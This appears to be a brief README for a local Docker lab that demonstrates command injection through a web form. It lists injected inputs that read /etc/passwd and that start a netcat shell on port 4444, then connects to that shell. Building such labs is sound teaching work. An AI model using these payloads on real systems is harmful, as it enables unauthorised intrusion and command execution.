
Demonstrate user input injection

```
docker build -t injection-lab .
docker run --rm -p 8000:8000 -p 4444:4444 injection-lab
```

On your browser, visit `localhost:8000`

Normal: enter "127.0.0.1"

Evil: enter "127.0.0.1; cat /etc/passwd"

Reverse shell: "127.0.0.1; /usr/bin/nc -lvp 4444 -e /bin/sh"

Then on your attacker machine/host, run "nc localhost 4444", type a command, e.g. "id"
